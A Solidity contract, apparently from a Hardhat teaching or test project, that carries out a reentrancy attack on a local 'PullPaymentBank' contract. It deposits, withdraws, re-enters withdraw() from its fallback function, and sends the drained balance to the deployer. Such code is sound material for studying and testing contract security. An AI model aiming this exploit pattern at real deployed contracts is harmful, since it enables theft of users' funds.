//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "hardhat/console.sol";

import "./PullPaymentBank.sol";

contract PullPaymentThief {
    address thief;
    PullPaymentBank bank;

    constructor(address bankAddress) {
        thief = msg.sender;
        bank = PullPaymentBank(bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }

    function steal() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();

        (bool success, ) = thief.call{value: address(this).balance}("");
        require(success);
    }
}
